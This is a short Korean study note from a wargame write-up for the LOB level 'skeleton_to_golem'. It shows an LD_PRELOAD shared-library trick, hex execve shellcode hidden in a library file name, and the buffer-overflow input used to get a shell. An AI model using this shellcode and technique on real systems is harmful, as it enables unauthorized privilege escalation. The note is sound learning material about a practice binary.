#week2  
##lob  
###skeleton_to_golem  
golem.c를 분석하면 stack을 완전히 0으로 초기화시켜버린다.ㅎㅎ  
멘붕와서 2시간 정도 뻘짓하다 검색하기 시작했다.    
이 문제는 공유 라이브러리를 이용해 해결한다는 것을 알게 되었다.  
포너블 관련 발표에서 들어본 거 같다.  
LD_PRELOAD라는 환경 변수가 등록되어 있으면 프로세스가 로딩 시  
LD_PRELOAD에 지정된 라이브러리를 가장 먼저 로딩한다.  
먼저 공유 라이브러리를 만들기 위해 빈 golen.c라는 빈 c 파일을 만들어준다.  
gcc 명령어에 -fPIC와 -shared -o옵션을 사용하여 공유 라이브러리로 컴파일해준다.  
gcc -FPIC -shared -o  $(python -c 'print("\x90"*100+"\x31\xc0\x50\xbe\x2e\x
72\x67\x81\xc6\x01\x01\x01\x01\x56\xbf\x2e\x62\x69\x6e\x47\x57\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")') golen.c  
그런 다음 export 명령어를 통해 shellcode를 이름으로 만든 공유 라이브러리를 LD PRELOAD 환경 변수에 등록해준다.  
이제 golem을 복사한 후 gdb를 연다.  
그리고 strcpy호출이 끝나는 부분에 브레이크 포인트를 걸어주고 공유 라이브러리의 주소를 얻는다.  
이때 공유 라이브러리의 주소는 스텍 영역보다 낮은 곳에 저장되기에 x/100x $ebp-2000쯤 해준다고 한다.  
이제 알아낸 주소를 통해 bash를 확인 가능하다.  
 ./golem $(python -c 'print("\x90"*44+"\xc8\xf5\xff\xbf")')  
이 문제를 풀면서 writeup을 따라하게 되었다.    
아마 여기서부터의 문제는 2회독 정도를 더 해야할 듯하다.  
